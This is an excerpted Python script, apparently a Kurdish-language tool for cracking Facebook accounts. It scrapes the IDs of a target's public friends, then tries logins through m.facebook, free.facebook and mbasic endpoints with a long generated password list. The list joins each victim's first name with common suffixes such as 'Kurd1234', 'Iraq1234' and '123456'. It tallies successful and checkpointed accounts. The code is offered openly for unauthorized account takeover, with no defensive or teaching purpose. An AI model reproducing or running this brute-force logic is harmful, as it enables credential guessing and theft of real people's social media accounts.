# Decrypt BY BLACK ÊVILDOER XD
# HAAHHA Fuck YOU Bro.
# ➢ TOOL IS FREE NO MONEY CRAZY.
import os
import sys
import time
import requests
...
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 GoogleApp/13.25.10.26.arm64;]"}
...
os.system('kuybashy kuybashy-u > list.txt')
uid = open('list.txt', 'r')
...
def chk():
  ...
  try:
    httpCaht = requests.get("ڕاو دانێ").text
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @B_1_2_4.......")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def menu(my_name,my_id):
	...
	banner()
	r1 =input("nawe barezt = ")
	r2 =input("nwe bawkt =  ")
	print("welcome "+r1+" "+r2)
	sg = '# AUTHOR : @kuybashy '#00E1EE
	fx = mark(sg, style='bold blue')
	sol().print(fx)
	io = '◈───[01]───🤍CRACK B REKA PUBLIC FRIENDS\n◈───[02]───🤍 sayr krdni crack krawakan\n◈───[00]───🤍 00 LEBDA TA LOGOUT BET'
	oi = nel(io, style='bold blue')
	cetak(nel(oi, title=' MENU-TOOL '))
	jh = input(x+''+p+' '+x+' raqamak halbzhera : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		file()
...
def file():
	...
	sol().print(mark(tek, style='blue'), style='on blue')
...
def setting():
	...
	teks = '[bold blue][01] CRACK OLD ID\n[02] CRACK NEW ID\n[03] CRACK RANDOM ID[/bold blue]'
	...
	ioz = '[bold blue][01] 👽M-FACEBOOK👽\n[02] 👽FREE-FACEBOOK👽\n[03] 👽MBASIC-FACEBOOK👽[/bold blue]'
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'A7a12345678')
					pwv.append(frs+'Aha12345678')
					pwv.append(frs+'Ahmad12345678')
					...
					pwv.append(frs+'Hama123456789')
					pwv.append(frs+'HAMA123456789')
					pwv.append(frs+'KURD12341234')
					pwv.append(frs+'Ranya12345678')
					pwv.append(frs+'xoshnaw12345678')
					pwv.append(frs+'xoshnaw123456789')
					pwv.append(frs+'1515')
					pwv.append(frs+frs+'1111')
					...
					pwv.append(frs+'1111')
					pwv.append(frs+'6969')
					pwv.append(frs+'131313')
					pwv.append(frs+'A7A2004')
					pwv.append(frs+'A7a2004')
					pwv.append(frs+'Eso2004')
					pwv.append(frs+'Eso1234')
					pwv.append(frs+'01234')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1000')
					pwv.append(frs+'Dalak')
					pwv.append(frs+'Shex1234')
					pwv.append(frs+'112233332211')
					pwv.append(frs+'1999')
					pwv.append(frs+'Solo1122')
					pwv.append(frs+'0011')
					pwv.append(frs+'kurdstan1122')
					pwv.append(frs+'kurdstan112233')
					pwv.append(frs+'kurdstan11223344')
					pwv.append(frs+'kurdstan1234')
					pwv.append(frs+'kurd1122')
					pwv.append(frs+'kurd1234')
					pwv.append(frs+'1122')
					pwv.append(frs+'King1234')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1234512345')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'123456654321')
					pwv.append(frs+'123123')
					pwv.append(frs+'Iraq1234')
					pwv.append(frs+'12345678910')
					pwv.append(frs+'1234')
					pwv.append(frs+'12344321')
					pwv.append(frs+'4321')
					pwv.append(frs+'43211234')
					pwv.append(frs+'123321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s😂ISMAHIL😂 %s/%s 😂OK:%s 😂CP:%s 😂 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s👽ismahil-START👽 %s/%s 👽Ok*%s 👽CP *%s 👽 %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
